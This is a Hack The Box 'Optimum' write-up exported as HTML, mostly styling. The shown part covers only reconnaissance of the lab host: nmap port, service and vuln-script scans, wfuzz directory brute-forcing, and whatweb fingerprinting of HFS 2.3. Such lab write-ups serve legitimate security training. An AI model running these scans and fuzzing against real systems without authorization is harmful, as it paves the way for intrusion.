@@ -1,0 +1,1335 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Optimum - HTB</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="127d1b9f-8847-804a-a048-ddb72c40d931" class="page sans"><header><h1 class="page-title"><strong>Optimum - HTB</strong></h1><p class="page-description"></p></header><div class="page-body"><figure id="127d1b9f-8847-8028-8ecd-d723fff3d730" class="image"><a href="../img/OPTIMUM/image.png"><img style="width:707.96875px" src="../img/OPTIMUM/image.png"/></a></figure><h1 id="127d1b9f-8847-80d7-8dea-e6aaf15046fc" class="">Information Gathering &amp; Enumeration</h1><h2 id="127d1b9f-8847-8057-b280-edad335073f6" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80fd-958e-e2f99bc9e661" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ sudo nmap -sS -p- --min-rate=5000 -T5 -n 10.10.10.8 
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-21 21:04 -05
+Nmap scan report for 10.10.10.8
+Host is up (0.12s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 26.76 seconds
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80e0-9a2e-ce2a9f18bed6" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nmap -sVC -T5 10.10.10.8
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-21 21:05 -05
+Nmap scan report for 10.10.10.8
+Host is up (0.12s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.30 seconds
+                                   </code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-8020-99bd-f37d5d25a6d2" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nmap --script vuln 10.10.10.8                            
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-21 21:05 -05
+Nmap scan report for 10.10.10.8
+Host is up (0.12s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+| http-fileupload-exploiter: 
+|   
+|_    Couldn&#x27;t find a file-type field.
+|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.
+| http-vuln-cve2011-3192: 
+|   VULNERABLE:
+|   Apache byterange filter DoS
+|     State: VULNERABLE
+|     IDs:  BID:49303  CVE:CVE-2011-3192
+|       The Apache web server is vulnerable to a denial of service attack when numerous
+|       overlapping byte ranges are requested.
+|     Disclosure date: 2011-08-19
+|     References:
+|       https://seclists.org/fulldisclosure/2011/Aug/175
+|       https://www.securityfocus.com/bid/49303
+|       https://www.tenable.com/plugins/nessus/55976
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.
+| http-method-tamper: 
+|   VULNERABLE:
+|   Authentication bypass by HTTP verb tampering
+|     State: VULNERABLE (Exploitable)
+|       This web server contains password protected resources vulnerable to authentication bypass
+|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
+|        common HTTP methods and in misconfigured .htaccess files.
+|              
+|     Extra information:
+|       
+|   URIs suspected to be vulnerable to HTTP verb tampering:
+|     /~login [GENERIC]
+|   
+|     References:
+|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
+|       http://capec.mitre.org/data/definitions/274.html
+|       http://www.mkit.com.ar/labs/htexploit/
+|_      http://www.imperva.com/resources/glossary/http_verb_tampering.html
+
+Nmap done: 1 IP address (1 host up) scanned in 233.24 seconds
+                                                                </code></pre><h2 id="127d1b9f-8847-80da-a14d-ef06af77f0c9" class="">Directory Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80c5-a4d1-ee033db2bb6f" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.8/FUZZ -t 50 --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.8/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                          
+=====================================================================
+
+000004255:   200        120 L    281 W      3835 Ch     &quot;http://10.10.10.8/&quot;                             
+
+Total time: 247.2229
+Processed Requests: 29949
+Filtered Requests: 29948
+Requests/sec.: 121.1416
+
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80aa-af5a-d6927c744e12" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.8/FUZZ -t 50 --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.8/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                           
+=====================================================================
+
+000000004:   200        120 L    281 W      3835 Ch     &quot;#&quot;                                               
+000000008:   200        120 L    281 W      3835 Ch     &quot;# or send a letter to Creative Commons, 171 Secon
+                                                        d Street,&quot;                                        
+000000005:   200        120 L    281 W      3835 Ch     &quot;# This work is licensed under the Creative Common
+                                                        s&quot;                                                
+000000002:   200        120 L    281 W      3835 Ch     &quot;#&quot;                                               
+000000009:   200        120 L    281 W      3835 Ch     &quot;# Suite 300, San Francisco, California, 94105, US
+                                                        A.&quot;                                               
+000000006:   200        120 L    281 W      3835 Ch     &quot;# Attribution-Share Alike 3.0 License. To view a 
+                                                        copy of this&quot;                                     
+000000011:   200        120 L    281 W      3835 Ch     &quot;# Priority ordered case-sensitive list, where ent
+                                                        ries were found&quot;                                  
+000000010:   200        120 L    281 W      3835 Ch     &quot;#&quot;                                               
+000000012:   200        120 L    281 W      3835 Ch     &quot;# on at least 2 different hosts&quot;                 
+000000014:   200        120 L    281 W      3835 Ch     &quot;http://10.10.10.8/&quot;                              
+000000013:   200        120 L    281 W      3835 Ch     &quot;#&quot;                                               
+
+Total time: 9.142553
+Processed Requests: 304
+Filtered Requests: 293
+Requests/sec.: 33.25110
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 7: Failed to connect to 10.10.10.8 port 80 after 328 ms: Couldn&#x27;t connect to server
+
+                                                              </code></pre><h2 id="127d1b9f-8847-8099-9a56-eb9061269783" class="">Web Tech enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="127d1b9f-8847-80b9-b9f2-ee05f43e56a5" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ whatweb &quot;http://10.10.10.8&quot; -a 3            
+http://10.10.10.8 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
